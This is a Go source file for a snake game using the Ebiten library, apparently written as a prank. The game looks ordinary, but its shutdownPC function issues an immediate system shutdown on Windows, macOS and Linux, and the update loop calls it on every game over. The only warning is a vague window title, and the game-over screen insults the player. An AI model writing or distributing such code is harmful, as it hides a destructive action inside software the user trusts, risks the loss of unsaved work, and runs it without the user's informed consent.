package main

import (
	"image/color"
	"log"
	"math/rand"
	"os/exec"
	"runtime"
	"time"

	"github.com/hajimehoshi/ebiten/v2"
	"github.com/hajimehoshi/ebiten/v2/ebitenutil"
)

const (
	screenWidth    = 640
	screenHeight   = 480
	cellSize       = 20
	gridWidth      = screenWidth / cellSize
	gridHeight     = screenHeight / cellSize
	updateInterval = 150 * time.Millisecond
)

type Point struct {
	X, Y int
}

type Game struct {
	snake      []Point
	dir        Point
	food       Point
	lastUpdate time.Time
	gameover   bool
}

func NewGame() *Game {
	rand.Seed(time.Now().UnixNano())
	startX := gridWidth / 2
	startY := gridHeight / 2
	snake := []Point{
		{startX, startY},
		{startX - 1, startY},
		{startX - 2, startY},
	}
	g := &Game{
		snake:      snake,
		dir:        Point{1, 0},
		lastUpdate: time.Now(),
	}
	g.spawnFood()
	return g
}

func (g *Game) spawnFood() {
	for {
		x := rand.Intn(gridWidth)
		y := rand.Intn(gridHeight)
		pos := Point{x, y}
		overlap := false
		for _, s := range g.snake {
			if s == pos {
				overlap = true
				break
			}
		}
		if !overlap {
			g.food = pos
			return
		}
	}
}

func (g *Game) shutdownPC() {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("shutdown", "/s", "/t", "0")
	} else if runtime.GOOS == "darwin" || runtime.GOOS == "linux" {
		cmd = exec.Command("shutdown", "-h", "now")
	} else {
		return
	}
	_ = cmd.Start()
}

func (g *Game) Update() error {
	if g.gameover {
		return nil
	}
	if time.Since(g.lastUpdate) < updateInterval {
		return nil
	}
	g.lastUpdate = time.Now()

	if ebiten.IsKeyPressed(ebiten.KeyArrowUp) && g.dir.Y != 1 {
		g.dir = Point{0, -1}
	} else if ebiten.IsKeyPressed(ebiten.KeyArrowDown) && g.dir.Y != -1 {
		g.dir = Point{0, 1}
	} else if ebiten.IsKeyPressed(ebiten.KeyArrowLeft) && g.dir.X != 1 {
		g.dir = Point{-1, 0}
	} else if ebiten.IsKeyPressed(ebiten.KeyArrowRight) && g.dir.X != -1 {
		g.dir = Point{1, 0}
	}

	head := g.snake[0]
	newHead := Point{head.X + g.dir.X, head.Y + g.dir.Y}

	if newHead.X < 0 || newHead.X >= gridWidth || newHead.Y < 0 || newHead.Y >= gridHeight {
		g.gameover = true
		go g.shutdownPC()
		return nil
	}

	for _, s := range g.snake {
		if s == newHead {
			g.gameover = true
			go g.shutdownPC()
			return nil
		}
	}

	if newHead == g.food {
		g.snake = append([]Point{newHead}, g.snake...)
		g.spawnFood()
	} else {
		g.snake = append([]Point{newHead}, g.snake[:len(g.snake)-1]...)
	}

	return nil
}

func (g *Game) Draw(screen *ebiten.Image) {
	screen.Fill(color.RGBA{0x00, 0x10, 0x00, 0xff})

	ebitenutil.DrawRect(
		screen,
		float64(g.food.X*cellSize),
		float64(g.food.Y*cellSize),
		cellSize, cellSize,
		color.RGBA{0xff, 0x00, 0x00, 0xff},
	)

	for _, s := range g.snake {
		ebitenutil.DrawRect(
			screen,
			float64(s.X*cellSize),
			float64(s.Y*cellSize),
			cellSize, cellSize,
			color.White,
		)
	}

	if g.gameover {
		ebitenutil.DebugPrint(screen, "Fucking loser (Press R)")
		if ebiten.IsKeyPressed(ebiten.KeyR) {
			*g = *NewGame()
		}
	}
}

func (g *Game) Layout(outsideWidth, outsideHeight int) (int, int) {
	return screenWidth, screenHeight
}

func main() {
	game := NewGame()
	ebiten.SetWindowSize(screenWidth, screenHeight)
	ebiten.SetWindowTitle("I wouldn't lose the game if I was you")
	if err := ebiten.RunGame(game); err != nil {
		log.Fatal(err)
	}
}
